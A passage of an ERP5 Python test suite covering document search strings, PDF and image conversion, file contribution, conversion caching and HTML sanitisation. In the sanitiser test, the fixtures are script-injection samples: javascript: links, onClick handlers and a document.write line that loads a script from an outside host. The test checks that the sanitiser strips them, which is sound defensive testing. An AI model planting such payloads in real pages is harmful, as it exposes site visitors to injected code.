    self.assertEquals(kw['search_portal_type'], parsed_string['portal_type'])
    self.assertEquals(kw['reference'], parsed_string['reference'])
    self.assertEquals(kw['version'], parsed_string['version'])
    
    # search by language
    kw['language'] = 'en'
    search_string = assemble(**kw)
    parsed_string = parse(search_string)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2 created:1w AND (portal_type:Document) reference:Nxd-test version:001 language:en', \
                      search_string)
    self.assertSameSet(['searchabletext', 'creation_from', 'portal_type', 'reference', \
                        'version', 'language'], \
                        parsed_string.keys())
    self.assertEquals(kw['search_portal_type'], parsed_string['portal_type'])
    self.assertEquals(kw['reference'], parsed_string['reference'])
    self.assertEquals(kw['version'], parsed_string['version'])
    self.assertEquals(kw['language'], parsed_string['language'])
    
    # contributor title search
    kw['contributor_title'] = 'John'
    search_string = assemble(**kw)
    parsed_string = parse(search_string)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2 created:1w AND (portal_type:Document) reference:Nxd-test version:001 language:en contributor_title:John', \
                      search_string)
    self.assertSameSet(['searchabletext', 'creation_from', 'portal_type', 'reference', \
                        'version', 'language', 'contributor_title'], \
                        parsed_string.keys())
    self.assertEquals(kw['search_portal_type'], parsed_string['portal_type'])
    self.assertEquals(kw['reference'], parsed_string['reference'])
    self.assertEquals(kw['version'], parsed_string['version'])
    self.assertEquals(kw['language'], parsed_string['language'])
    
    # only my docs
    kw['mine'] = 'yes'
    search_string = assemble(**kw)
    parsed_string = parse(search_string)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2 created:1w AND (portal_type:Document) reference:Nxd-test version:001 language:en contributor_title:John mine:yes', \
                      search_string)
    self.assertSameSet(['searchabletext', 'creation_from', 'portal_type', 'reference', \
                        'version', 'language', 'contributor_title', 'mine'], \
                        parsed_string.keys())
    self.assertEquals(kw['search_portal_type'], parsed_string['portal_type'])
    self.assertEquals(kw['reference'], parsed_string['reference'])
    self.assertEquals(kw['version'], parsed_string['version'])
    self.assertEquals(kw['language'], parsed_string['language'])
    self.assertEquals(kw['mine'], parsed_string['mine'])
    
    # only newest versions 
    kw['newest'] = 'yes'
    search_string = assemble(**kw)
    parsed_string = parse(search_string)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2 created:1w AND (portal_type:Document) reference:Nxd-test version:001 language:en contributor_title:John mine:yes newest:yes', \
                      search_string)
    self.assertSameSet(['searchabletext', 'creation_from', 'portal_type', 'reference', \
                        'version', 'language', 'contributor_title', 'mine', 'newest'], \
                        parsed_string.keys())
    self.assertEquals(kw['search_portal_type'], parsed_string['portal_type'])
    self.assertEquals(kw['reference'], parsed_string['reference'])
    self.assertEquals(kw['version'], parsed_string['version'])
    self.assertEquals(kw['language'], parsed_string['language'])
    self.assertEquals(kw['mine'], parsed_string['mine'])
    self.assertEquals(kw['newest'], parsed_string['newest'])
    
    # search mode 
    kw['search_mode'] = 'in_boolean_mode'
    search_string = assemble(**kw)
    parsed_string = parse(search_string)
    self.assertEquals('searchabletext_any "searchabletext_phrase1 searchabletext_phrase1"  +searchabletext_all1 +searchabletext_all2 -searchabletext_without1 -searchabletext_without2 created:1w AND (portal_type:Document) reference:Nxd-test version:001 language:en contributor_title:John mine:yes newest:yes mode:boolean', \
                      search_string)
    self.assertSameSet(['searchabletext', 'creation_from', 'portal_type', 'reference', \
                        'version', 'language', 'contributor_title', 'mine', 'newest', 'mode'], \
                        parsed_string.keys())
    self.assertEquals(kw['search_portal_type'], parsed_string['portal_type'])
    self.assertEquals(kw['reference'], parsed_string['reference'])
    self.assertEquals(kw['version'], parsed_string['version'])
    self.assertEquals(kw['language'], parsed_string['language'])
    self.assertEquals(kw['mine'], parsed_string['mine'])
    self.assertEquals(kw['newest'], parsed_string['newest'])
    self.assertEquals('boolean', parsed_string['mode'])

    # search with multiple portal_type
    kw = {'search_portal_type': ['Document','Presentation','Web Page'],
           'searchabletext_any': 'erp5'}
    search_string = assemble(**kw)
    parsed_string = parse(search_string)
    self.assertEquals('erp5 AND (portal_type:Document OR portal_type:Presentation OR portal_type:"Web Page")', \
                      search_string)
    self.assertSameSet(['searchabletext', 'portal_type'], \
                        parsed_string.keys())
    #self.assertEquals(kw['search_portal_type'], parsed_string['portal_type'])

    # parse with multiple portal_type containing spaces in one portal_type
    search_string = 'erp5 AND (portal_type:Document OR portal_type:Presentation OR portal_type:"Web Page")'
    parsed_string = parse(search_string)
    self.assertEquals(parsed_string['portal_type'], ['Document','Presentation','Web Page'])


  def test_11_Base_getAdvancedSearchResultList(self):
    """
    Test search string search capabilities using Base_getAdvancedSearchResultList script.
    """
    portal = self.portal
    assemble = portal.Base_assembleSearchString
    search = portal.Base_getAdvancedSearchResultList

    def getAdvancedSearchStringResultList(**kw):
      search_string = assemble(**kw)
      return [x.getObject() for x in search(search_string)]

    # create some objects
    document_1 = portal.document_module.newContent(
                   portal_type = 'File',
                   description = 'standalone software linux python free',
                   version = '001',
                   language = 'en',
                   reference = 'nxd-test-doc-1')
    document_2 = portal.document_module.newContent(
                   portal_type = 'Presentation',
                   description = 'standalone free python linux knowledge system management different',
                   version = '002',
                   language = 'fr',
                   reference = 'nxd-test-doc-2')
    document_3 = portal.document_module.newContent(
                   portal_type = 'Presentation',
                   description = 'just a copy',
                   version = '003',
                   language = 'en',
                   reference = 'nxd-test-doc-2')
    # multiple revisions of a Web Page
    web_page_1 = portal.web_page_module.newContent(
                   portal_type = 'Web Page',
                   text_content = 'software based solutions document management product standalone owner different',
                   version = '003',
                   language = 'jp',
                   reference = 'nxd-test-web-page-3')
    web_page_2 = portal.web_page_module.newContent(
                   portal_type = 'Web Page',
                   text_content = 'new revision (004) of nxd-test-web-page-3',
                   version = '004',
                   language = 'jp',
                   reference = 'nxd-test-web-page-3')
    web_page_3 = portal.web_page_module.newContent(
                   portal_type = 'Web Page',
                   text_content = 'new revision (005) of nxd-test-web-page-3',
                   version = '005',
                   language = 'jp',
                   reference = 'nxd-test-web-page-3')
    # publish documents so we can test searching within owned documents for an user
    for document in (document_1, document_2, document_3, web_page_1, web_page_2, web_page_3):
      document.publish()
    # create test Person objects and add pseudo local security
    person1 =  self.createUser(reference='user1')
    person1.setTitle('Another Contributor')
    portal.document_module.manage_setLocalRoles('user1', ['Assignor',])
    self.stepTic()

    # login as another user
    ERP5TypeTestCase.login(self, 'user1')
    document_4 = portal.document_module.newContent(
                   portal_type = 'Presentation',
                   description = 'owner different user contributing document',
                   version = '003',
                   language = 'bg',
                   reference = 'tlv-test-doc-1')
    contributor_list = document_4.getContributorValueList()
    contributor_list.append(person1)
    document_4.setContributorValueList(contributor_list)
    document_4.publish()
    self.stepTic()
    self.login()

    # search arbitrary word
    kw = {'searchabletext_any': 'software'}
    self.assertSameSet([document_1,web_page_1], getAdvancedSearchStringResultList(**kw))
    
    # exact word search
    kw = {'searchabletext_phrase': 'linux python'}
    self.assertSameSet([document_1], getAdvancedSearchStringResultList(**kw))
    kw = {'searchabletext_phrase': 'python linux'}
    self.assertSameSet([document_2], getAdvancedSearchStringResultList(**kw))
    kw = {'searchabletext_any': '',
          'searchabletext_phrase': 'python linux knowledge system'}
    self.assertSameSet([document_2], getAdvancedSearchStringResultList(**kw))
    
    # search "with all of the words" - each word prefixed by "+"
    kw = {'searchabletext_any': 'standalone',
          'searchabletext_all': 'python'}
    self.assertSameSet([document_1, document_2], getAdvancedSearchStringResultList(**kw))
    
    # search without these words - every word prefixed by "-"
    kw = {'searchabletext_any': 'standalone',
          'searchabletext_without': 'python'}
    self.assertSameSet([web_page_1], getAdvancedSearchStringResultList(**kw))
   
    # only given portal_types - add "type:Type" or type:(Type1,Type2...)
    kw = {'searchabletext_any': 'python',
          'search_portal_type': 'Presentation'}
    self.assertSameSet([document_2], getAdvancedSearchStringResultList(**kw))
    kw = {'searchabletext_any': 'python',
          'search_portal_type': 'File'}
    self.assertSameSet([document_1], getAdvancedSearchStringResultList(**kw))
    kw = {'searchabletext_any': 'management',
          'search_portal_type': 'File'}
    self.assertSameSet([], getAdvancedSearchStringResultList(**kw))
   
    # search by reference
    kw = {'reference': document_2.getReference()}
    self.assertSameSet([document_2, document_3], getAdvancedSearchStringResultList(**kw))
    kw = {'searchabletext_any': 'copy',
          'reference': document_2.getReference()}
    self.assertSameSet([document_3], getAdvancedSearchStringResultList(**kw))
    kw = {'searchabletext_any': 'copy',
          'reference': document_2.getReference(),
          'search_portal_type': 'File'}
    self.assertSameSet([], getAdvancedSearchStringResultList(**kw))
  
    # search by version
    kw = {'reference': document_2.getReference(),
          'version': document_2.getVersion()}
    self.assertSameSet([document_2], getAdvancedSearchStringResultList(**kw))
    kw = {'reference': document_2.getReference(),
          'version': document_2.getVersion(),
          'search_portal_type': 'File'}
    self.assertSameSet([], getAdvancedSearchStringResultList(**kw))
   
    # search by language
    kw = {'reference': document_2.getReference(),
          'language': document_2.getLanguage()}
    self.assertSameSet([document_2], getAdvancedSearchStringResultList(**kw))
    kw = {'reference': document_2.getReference(),
          'language': document_3.getLanguage()}
    self.assertSameSet([document_3], getAdvancedSearchStringResultList(**kw))
    kw = {'reference': document_2.getReference(),
          'language': document_3.getLanguage(),
          'search_portal_type': 'File'}
    self.assertSameSet([], getAdvancedSearchStringResultList(**kw))
  
    # only my docs
    ERP5TypeTestCase.login(self, 'user1')
    kw = {'searchabletext_any': 'owner'}
    # should return all documents matching a word no matter if we're owner or not
    self.assertSameSet([web_page_1, document_4], getAdvancedSearchStringResultList(**kw))
    kw = {'searchabletext_any': 'owner',
          'mine': 'yes'}
    # should return ONLY our own documents matching a word
    self.assertSameSet([document_4], getAdvancedSearchStringResultList(**kw))
    self.login()
    
    # only newest versions
    # should return ALL documents for a reference
    kw = {'reference': web_page_1.getReference()}
    self.assertSameSet([web_page_1, web_page_2, web_page_3], getAdvancedSearchStringResultList(**kw))
    # should return ONLY newest document for a reference
    kw = {'reference': web_page_1.getReference(),
          'newest': 'yes'}
    self.assertSameSet([web_page_3], getAdvancedSearchStringResultList(**kw))

    # contributor title search
    kw = {'searchabletext_any': 'owner'}
    # should return all documents matching a word no matter of contributor
    self.assertSameSet([web_page_1, document_4], getAdvancedSearchStringResultList(**kw))
    kw = {'searchabletext_any': 'owner',
          'contributor_title': '%Contributor%'}
    self.assertSameSet([document_4], getAdvancedSearchStringResultList(**kw))

    # multiple portal_type specified
    kw = {'search_portal_type': 'File,Presentation'}
    self.assertSameSet([document_1, document_2, document_3, document_4], getAdvancedSearchStringResultList(**kw))

    # XXX: search limited to a certain date range
    # XXX: search mode

  def test_PDFTextContent(self):
    upload_file = makeFileUpload('REF-en-001.pdf')
    document = self.portal.portal_contributions.newContent(file=upload_file)
    self.assertEquals('PDF', document.getPortalType())
    self.assertEquals('I use reference to look up TEST\n',
                      document._convertToText())
    self.assert_('I use reference to look up TEST' in
                 document._convertToHTML().replace('&nbsp;', ' '))
    self.assert_('I use reference to look up TEST' in
                 document.SearchableText())

  def test_PDFToImage(self):
    upload_file = makeFileUpload('REF-en-001.pdf')
    document = self.portal.portal_contributions.newContent(file=upload_file)
    self.assertEquals('PDF', document.getPortalType())

    content_type, image_data = document.convert(format='png',
                                                frame=0,
                                                display='thumbnail')
    # it's a valid PNG
    self.assertEquals('PNG', image_data[1:4])

  def test_PDF_content_information(self):
    upload_file = makeFileUpload('REF-en-001.pdf')
    document = self.portal.portal_contributions.newContent(file=upload_file)
    self.assertEquals('PDF', document.getPortalType())
    content_information = document.getContentInformation()
    self.assertEquals('1', content_information['Pages'])
    self.assertEquals('subject', content_information['Subject'])
    self.assertEquals('title', content_information['Title'])
    self.assertEquals('application/pdf', document.getContentType())

  def test_PDF_content_information_extra_metadata(self):
    # Extra metadata, such as those stored by pdftk update_info are also
    # available in document.getContentInformation()
    upload_file = makeFileUpload('metadata.pdf')
    document = self.portal.portal_contributions.newContent(file=upload_file)
    self.assertEquals('PDF', document.getPortalType())
    content_information = document.getContentInformation()
    self.assertEquals('the value', content_information['NonStandardMetadata'])

  def test_PDF_content_content_type(self):
    upload_file = makeFileUpload('REF-en-001.pdf')
    document = self.portal.document_module.newContent(portal_type='PDF')
    # Here we use edit instead of setFile,
    # because only edit method set filename as source_reference.
    document.edit(file=upload_file)
    self.assertEquals('application/pdf', document.getContentType())

  def test_Document_getStandardFileName(self):
    upload_file = makeFileUpload('metadata.pdf')
    document = self.portal.document_module.newContent(portal_type='PDF')
    # Here we use edit instead of setFile,
    # because only edit method set filename as source_reference.
    document.edit(file=upload_file)
    self.assertEquals(document.getStandardFileName(), 'metadata.pdf')
    self.assertEquals(document.getStandardFileName(format='png'),
                      'metadata.png')
    document.setVersion('001')
    document.setLanguage('en')
    self.assertEquals(document.getStandardFileName(), 'metadata-001-en.pdf')
    self.assertEquals(document.getStandardFileName(format='png'),
                      'metadata-001-en.png')
    # check when format contains multiple '.'
    upload_file = makeFileUpload('TEST-en-003.odp')
    document = self.portal.document_module.newContent(portal_type='Presentation')
    # Here we use edit instead of setFile,
    # because only edit method set filename as source_reference.
    document.edit(file=upload_file)
    self.assertEquals(document.getStandardFileName(), 'TEST-en-003.odp')
    self.assertEquals('TEST-en-003.odg', document.getStandardFileName(format='odp.odg'))


  def test_CMYKImageTextContent(self):
    upload_file = makeFileUpload('cmyk_sample.jpg')
    document = self.portal.portal_contributions.newContent(file=upload_file)
    self.assertEquals('Image', document.getPortalType())
    self.assertEquals('ERP5 is a free software.\n', document.asText())

  def test_Base_showFoundText(self):
    # Create document with good content
    document = self.portal.document_module.newContent(portal_type='Drawing')
    self.assertEquals('empty', document.getExternalProcessingState())

    upload_file = makeFileUpload('TEST-en-002.odt')
    document.edit(file=upload_file)
    self.stepTic()
    self.assertEquals('converted', document.getExternalProcessingState())

    # Upload different type of file inside which can not be converted to base format
    upload_file = makeFileUpload('REF-en-001.pdf')
    document.edit(file=upload_file)
    self.stepTic()
    self.assertEquals('application/pdf', document.getContentType())
    self.assertEquals('conversion_failed', document.getExternalProcessingState())
    # As document is not converted, text convertion is impossible
    # But document can still be retrive with portal catalog
    self.assertRaises(NotConvertedError, document.asText)
    self.assertRaises(NotConvertedError, document.getSearchableText)
    self.assertEquals('This document is not converted yet.',
                      document.Base_showFoundText())
    
    # upload again good content
    upload_file = makeFileUpload('TEST-en-002.odt')
    document.edit(file=upload_file)
    self.stepTic()
    self.assertEquals('converted', document.getExternalProcessingState())

  def test_Base_createNewFile(self):
    """
      Test contributing a file and attaching it to context.
    """
    person = self.portal.person_module.newContent(portal_type='Person')
    contributed_document = person.Base_contribute(
                                     portal_type=None,
                                     title=None,
                                     reference=None,
                                     short_title=None,
                                     language=None,
                                     version=None,
                                     description=None,
                                     attach_document_to_context=True,
                                     file=makeFileUpload('TEST-en-002.odt'))
    self.assertEquals('Text', contributed_document.getPortalType())
    self.stepTic()
    document_list = person.getFollowUpRelatedValueList()
    self.assertEquals(1, len(document_list))
    document = document_list[0]
    self.assertEquals('converted', document.getExternalProcessingState())
    self.assertEquals('Text', document.getPortalType())
    self.assertEquals('title', document.getTitle())
    self.assertEquals(contributed_document, document)

  def test_Base_createNewFile_empty(self):
    """
      Test contributing an empty file and attaching it to context.
    """
    person = self.portal.person_module.newContent(portal_type='Person')
    empty_file_upload = ZPublisher.HTTPRequest.FileUpload(FieldStorage(
                            fp=StringIO.StringIO(),
                            environ=dict(REQUEST_METHOD='PUT'),
                            headers={"content-disposition":
                              "attachment; filename=empty;"}))

    contributed_document = person.Base_contribute(
                                    portal_type=None,
                                    title=None,
                                    reference=None,
                                    short_title=None,
                                    language=None,
                                    version=None,
                                    description=None,
                                    attach_document_to_context=True,
                                    file=empty_file_upload)
    self.stepTic()
    document_list = person.getFollowUpRelatedValueList()
    self.assertEquals(1, len(document_list))
    document = document_list[0]
    self.assertEquals('File', document.getPortalType())
    self.assertEquals(contributed_document, document)

  def test_Base_createNewFile_forced_type(self):
    """Test contributing while forcing the portal type.
    """
    person = self.portal.person_module.newContent(portal_type='Person')
    contributed_document = person.Base_contribute(
                                     portal_type='PDF',
                                     file=makeFileUpload('TEST-en-002.odt'))
    self.assertEquals('PDF', contributed_document.getPortalType())

  def test_HTML_to_ODT_conversion_keep_enconding(self):
    """This test perform an PDF conversion of HTML content
    then to plain text.
    Check that encoding remains.
    """
    web_page_portal_type = 'Web Page'
    string_to_test = 'éààéôù'
    web_page = self.portal.getDefaultModule(web_page_portal_type)\
          .newContent(portal_type=web_page_portal_type)
    html_content = '<p>%s</p>' % string_to_test
    web_page.edit(text_content=html_content)
    mime_type, pdf_data = web_page.convert('pdf')
    text_content = self.portal.portal_transforms.\
                                      convertToData('text/plain',
                                          str(pdf_data),
                                          object=web_page, context=web_page,
                                          filename='test.pdf')
    self.assertTrue(string_to_test in text_content)

  def test_HTML_to_ODT_conversion_keep_related_image_list(self):
    """This test create a Web Page and an Image.
    HTML content of Web Page referred to that Image with it's reference.
    Check that ODT conversion of Web Page embed image data.
    """
    # create web page
    web_page_portal_type = 'Web Page'
    web_page = self.portal.getDefaultModule(web_page_portal_type)\
          .newContent(portal_type=web_page_portal_type)
    image_reference = 'MY-TESTED-IMAGE'
    # Target image with it reference only
    html_content = '<p><img src="%s"/></p>' % image_reference
    web_page.edit(text_content=html_content)

    # Create image
    image_portal_type = 'Image'
    image = self.portal.getDefaultModule(image_portal_type)\
          .newContent(portal_type=image_portal_type)

    # edit content and publish it
    upload_file = makeFileUpload('cmyk_sample.jpg')
    image.edit(reference=image_reference,
               version='001',
               language='en',
               file=upload_file)
    image.publish()

    transaction.commit()
    self.tic()

    # convert web_page into odt
    mime_type, odt_archive = web_page.convert('odt')
    builder = OOoBuilder(odt_archive)
    image_count = builder._image_count
    failure_message = 'Expected image not found in ODF zipped archive'
    # fetch image from zipped archive content then compare with ERP5 Image
    self.assertEquals(builder.extract('Pictures/%s.jpeg' % image_count),
                      image.getData(), failure_message)

    # Continue the test with image resizing support
    image_display = 'large'
    # Add url parameters
    html_content = '<p><img src="%s?display=%s&quality=75"/></p>' % \
                                              (image_reference, image_display)
    web_page.edit(text_content=html_content)
    mime_type, odt_archive = web_page.convert('odt')
    builder = OOoBuilder(odt_archive)
    image_count = builder._image_count
    # compute resized image for comparison
    mime, converted_image = image.convert(format='jpeg', display=image_display)
    # fetch image from zipped archive content
    # then compare with resized ERP5 Image
    self.assertEquals(builder.extract('Pictures/%s.jpeg' % image_count),
                      converted_image, failure_message)

  def test_addContributorToDocument(self):
    """
      Test if current authenticated user is added to contributor list of document
      (only if authenticated user is an ERP5 Person object)
    """
    portal = self.portal
    document_module = portal.document_module

    # create Person objects and add pseudo local security
    person1 =  self.createUser(reference='contributor1')
    document_module.manage_setLocalRoles('contributor1', ['Assignor',])
    person2 =  self.createUser(reference='contributor2')
    document_module.manage_setLocalRoles('contributor2', ['Assignor',])
    self.stepTic()

    # login as first one
    ERP5TypeTestCase.login(self, 'contributor1')
    doc = document_module.newContent(portal_type='File', 
                                     title='Test1')
    self.stepTic()
    self.login()
    self.assertSameSet([person1], 
                       doc.getContributorValueList())

    # login as second one
    ERP5TypeTestCase.login(self, 'contributor2')
    doc.edit(title='Test2')
    self.stepTic()
    self.login()
    self.assertSameSet([person1, person2], 
                       doc.getContributorValueList())

    # editing with non ERP5 Person object, nothing added to contributor
    self.login()
    doc.edit(title='Test3')
    self.stepTic()
    self.assertSameSet([person1, person2], 
                       doc.getContributorValueList())

  def test_safeHTML_conversion(self):
    """This test create a Web Page and test asSafeHTML conversion.
    Test also with a very non well-formed html document
    to stress conversion engine.
    """
    # create web page
    web_page_portal_type = 'Web Page'
    module = self.portal.getDefaultModule(web_page_portal_type)
    web_page = module.newContent(portal_type=web_page_portal_type)

    html_content = """<html>
      <head>
        <meta http-equiv="refresh" content="5;url=http://example.com/"/>
        <meta http-equiv="Set-Cookie" content=""/>
        <title>My dirty title</title>
        <style type="text/css">
          a {color: #FFAA44;}
        </style>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
      </head>
      <body>
        <div>
          <h1>My splendid title</h1>
        </div>
        <script type="text/javascript" src="http://example.com/something.js"/>
        <script type="text/javascript">
          alert("da");
        </script>
        <a href="javascript:DosomethingNasty()">Link</a>
        <a onClick="javascript:DosomethingNasty()">Another Link</a>
        <p>éàèù</p>
      </body>
    </html>
    """.decode('utf-8').encode('iso-8859-1')
    web_page.edit(text_content=html_content)

    # Check that outputed stripped html is safe
    safe_html = web_page.asStrippedHTML()
    self.assertTrue('My splendid title' in safe_html)
    self.assertTrue('script' not in safe_html, safe_html)
    self.assertTrue('something.js' not in safe_html, safe_html)
    self.assertTrue('<body>' not in safe_html)
    self.assertTrue('<head>' not in safe_html)
    self.assertTrue('<style' not in safe_html)
    self.assertTrue('#FFAA44' not in safe_html)
    self.assertTrue('5;url=http://example.com/' not in safe_html)
    self.assertTrue('Set-Cookie' not in safe_html)
    self.assertTrue('javascript' not in safe_html)
    self.assertTrue('alert("da");' not in safe_html)
    self.assertTrue('javascript:DosomethingNasty()' not in safe_html)
    self.assertTrue('onClick' not in safe_html)

    # Check that outputed entire html is safe
    entire_html = web_page.asEntireHTML()
    self.assertTrue('My splendid title' in entire_html)
    self.assertTrue('script' not in entire_html, entire_html)
    self.assertTrue('something.js' not in entire_html, entire_html)
    self.assertTrue('<title>' in entire_html)
    self.assertTrue('<body>' in entire_html)
    self.assertTrue('<head>' in entire_html)
    self.assertTrue('<style' in entire_html)
    self.assertTrue('#FFAA44' in entire_html)
    self.assertTrue('charset=utf-8' in entire_html)
    self.assertTrue('javascript' not in entire_html)
    self.assertTrue('alert("da");' not in entire_html)
    self.assertTrue('javascript:DosomethingNasty()' not in entire_html)
    self.assertTrue('onClick' not in entire_html)

    # now check converted value is stored in cache
    format = 'html'
    self.assertTrue(web_page.hasConversion(format=format))
    web_page.edit(text_content=None)
    self.assertFalse(web_page.hasConversion(format=format))

    # test with not well-formed html document
    html_content = """
    <HTML dir=3Dltr><HEAD>=0A=
<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dunicode">=0A=
<META content=3D"DIRTYHTML 6.00.2900.2722" name=3DGENERATOR></HEAD>=0A=

<BODY>=0A=
<DIV><FONT face=3D"Times New Roman" color=3D#000000 size=3D3>blablalba</FONT></DIV>=0A=
<DIV>&nbsp;</DIV>=0A=
<DIV></DIV>=0A=
<DIV>&nbsp;</DIV>=0A=
<DIV>&nbsp;</DIV>=0A=
<DIV>&nbsp;</DIV>=0A=
<br>=
<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\\=
" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">=
=0A<html xmlns=3D\\\"http://www.w3.org/1999/xhtml\\\">=0A<head>=0A<m=
eta http-equiv=3D\\\"Content-Type\\\" content=3D\\\"text/html; c=
harset=3Diso-8859-1\\\" />=0A<style type=3D\\\"text/css\\\">=0A<=
!--=0A.style1 {font-size: 8px}=0A.style2 {font-family: Arial, Helvetica, san=
s-serif}=0A.style3 {font-size: 8px; font-family: Arial, Helvetica, sans-seri=
f; }=0A-->=0A</style>=0A</head>=0A=0A<body>=0A<div>=0A  <p><span class=3D\\=
\\"style1\\\"><span class=3D\\\"style2\\\"><strong>I'm inside very broken HTML code</strong><br />=0A    ERP5<br />=0A
ERP5
<br />=0A    =
</span></span></p>=0A  <p class=3D\\\"sty=
le3\\\">ERP5:<br />=0A   </p>=0A  <p class=3D\\\"style3\\\"><strong>ERP5</strong>=

<br />=0A    ERP5</p>=0A</di=
v>=0A</body>=0A</html>=0A
<br>=
<!-- This is a comment, This string AZERTYY shouldn't be dislayed-->
<style>
<!-- a {color: #FFAA44;} -->
</style>
<table class=3DMoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 =
width=3D64
 style=3D'width:48.0pt;margin-left:-.75pt;border-collapse:collapse'>
 <tr style=3D'height:15.0pt'>
  <td width=3D64 nowrap valign=3Dbottom =
style=3D'width:48.0pt;padding:0cm 5.4pt 0cm 5.4pt;
  height:15.0pt'>
  <p class=3DMoNormal><span =
style=3D'color:black'>05D65812<o:p></o:p></span></p>
  </td>
 </tr>
</table>
<script LANGUAGE="JavaScript" type="text/javascript">
document.write('<sc'+'ript type="text/javascript" src="http://somosite.bg/utb.php"></sc'+'ript>');
</script>
</BODY></HTML>
    """
    web_page.edit(text_content=html_content)
    safe_html = web_page.asStrippedHTML()
    self.assertTrue('inside very broken HTML code' in safe_html)
    self.assertTrue('AZERTYY' not in safe_html)
    self.assertTrue('#FFAA44' in safe_html)

  def test_parallel_conversion(self):
    """Check that conversion engine is able to fill in
    cache without overwrite previous conversion
    when processed at the same time.
    """
    portal_type = 'PDF'
    document_module = self.portal.getDefaultModule(portal_type)
    document = document_module.newContent(portal_type=portal_type)

    upload_file = makeFileUpload('Forty-Two.Pages-en-001.pdf')
    document.edit(file=upload_file)
    pages_number = int(document.getContentInformation()['Pages'])
    transaction.commit()
    self.tic()

    preference_tool = getToolByName(self.portal, 'portal_preferences')
    image_size = preference_tool.getPreferredThumbnailImageHeight(),\
                              preference_tool.getPreferredThumbnailImageWidth()
    convert_kw = {'format': 'png',
                  'quality': 75,
                  'display': 'thumbnail',
                  'resolution': None}

    class ThreadWrappedConverter(Thread):
      """Use this class to run different convertion
      inside distinct Thread.
      """
      def __init__(self, publish_method, document_path,
                   frame_list, credential):
        self.publish_method = publish_method
        self.document_path = document_path
        self.frame_list = frame_list
        self.credential = credential
        Thread.__init__(self)

      def run(self):
        for frame in self.frame_list:
          # Use publish method to dispatch conversion among
          # all available ZServer threads.
          convert_kw['frame'] = frame
          response = self.publish_method(self.document_path,
                                         basic=self.credential,
                                         extra=convert_kw.copy())

          assert response.getHeader('content-type') == 'image/png', \
                                             response.getHeader('content-type')
          assert response.getStatus() == httplib.OK
        transaction.commit()

    # assume there is no password
    credential = '%s:' % (getSecurityManager().getUser().getId(),)
    tested_list = []
    frame_list = list(xrange(pages_number))
    # assume that ZServer is configured with 4 Threads
    conversion_per_tread = pages_number / 4
    while frame_list:
      local_frame_list = [frame_list.pop() for i in\
                            xrange(min(conversion_per_tread, len(frame_list)))]
      instance = ThreadWrappedConverter(self.publish, document.getPath(),
                                        local_frame_list, credential)
      tested_list.append(instance)
      instance.start()

    # Wait until threads finishing
    [tested.join() for tested in tested_list]

    transaction.commit()
    self.tic()

    convert_kw = {'format': 'png',
                  'quality': 75,
                  'image_size': image_size,
                  'resolution': None}

    result_list = []
    for i in xrange(pages_number):
      # all conversions should succeeded and stored in cache storage
      convert_kw['frame'] = i
      if not document.hasConversion(**convert_kw):
        result_list.append(i)
    self.assertEquals(result_list, [])

  def test_conversionCache_reseting(self):
    """Chack that modifying a document with edit method,
    compute a new cache key and refresh cached conversions.
    """
    web_page_portal_type = 'Web Page'
    module = self.portal.getDefaultModule(web_page_portal_type)
    web_page = module.newContent(portal_type=web_page_portal_type)
    html_content = """<html>
      <head>
        <title>My dirty title</title>
        <style type="text/css">
          a {color: #FFAA44;}
        </style>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     </head>
      <body>
        <div>
          <h1>My splendid title</h1>
        </div>
        <script type="text/javascript" src="http://example.com/something.js"/>
      </body>
    </html>
    """
    web_page.edit(text_content=html_content)
    web_page.convert(format='txt')
    self.assertTrue(web_page.hasConversion(format='txt'))
    web_page.edit(title='Bar')
    self.assertFalse(web_page.hasConversion(format='txt'))
    web_page.convert(format='txt')
    web_page.edit()
    self.assertFalse(web_page.hasConversion(format='txt'))

  def test_TextDocument_conversion_to_base_format(self):
    """Check that any files is converted into utf-8
    """
    web_page_portal_type = 'Web Page'
    module = self.portal.getDefaultModule(web_page_portal_type)
    upload_file = makeFileUpload('TEST-text-iso8859-1.txt')
    web_page = module.newContent(portal_type=web_page_portal_type,
                                 file=upload_file)

    text_content = web_page.getTextContent()
    my_utf_eight_token = 'ùééàçèîà'
    text_content = text_content.replace('\n', '\n%s\n' % my_utf_eight_token)
    web_page.edit(text_content=text_content)
    self.assertTrue(my_utf_eight_token in web_page.asStrippedHTML())
    self.assertTrue(isinstance(web_page.asEntireHTML().decode('utf-8'), unicode))

  def test_PDFDocument_asTextConversion(self):
    """Test a PDF document with embedded images
    To force usage of Ocropus portal_transform chain
    """
    portal_type = 'PDF'
    module = self.portal.getDefaultModule(portal_type)
    upload_file = makeFileUpload('TEST.Embedded.Image.pdf')
    document = module.newContent(portal_type=portal_type, file=upload_file)
    self.assertEquals(document.asText(), 'ERP5 is a free software.\n')

  def createRestrictedSecurityHelperScript(self):
    script_content_list = ['format=None, **kw', """
if not format:
  return 0
return 1
"""]
    for script_id in self.conversion_format_permission_script_id_list:
      createZODBPythonScript(self.getPortal().portal_skins.custom,
      script_id, *script_content_list)
      transaction.commit()

  def _test_document_conversion_to_base_format_no_original_format_access(self,
      portal_type, file_name):
    module = self.portal.getDefaultModule(portal_type)
    upload_file = makeFileUpload(file_name)
    document = module.newContent(portal_type=portal_type,
                                 file=upload_file)

    transaction.commit()
    self.tic()

    self.createRestrictedSecurityHelperScript()

    from AccessControl import Unauthorized
    # check that it is not possible to access document in original format
    self.assertRaises(Unauthorized, document.convert, format=None)
    # check that it is possible to convert document to text format
    dummy = document.convert(format='text')

  def test_WebPage_conversion_to_base_format_no_original_format_access(self):
    """Checks Document.TextDocument"""
    self._test_document_conversion_to_base_format_no_original_format_access(
      'Web Page',
